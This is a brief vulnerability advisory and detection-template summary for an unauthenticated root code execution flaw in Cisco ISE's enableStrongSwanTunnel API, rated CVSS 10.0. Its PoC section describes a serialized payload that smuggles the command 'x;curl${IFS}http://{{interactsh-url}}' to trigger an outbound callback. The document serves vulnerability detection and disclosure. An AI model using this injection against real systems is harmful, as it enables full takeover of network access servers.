## Vulnerability
Cisco ISE (and Cisco ISE-PIC) contains an unauthenticated remote code execution vulnerability in the `/deployment-rpc/enableStrongSwanTunnel` API due to insufficient validation of user-supplied input. An unauthenticated remote attacker can submit a crafted request to execute arbitrary code on the underlying OS as root. Impact: full system compromise. Remediation: update to the latest version. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 10.0).

## PoC / Detection
Classification: rce
The template sends one POST request to `/deployment-rpc/enableStrongSwanTunnel` containing a Java serialized payload that, when deserialized, executes the command `x;curl${IFS}http://{{interactsh-url}}`. It matches on an HTTP interactsh callback, status code 200, and response body length exactly 2 bytes.
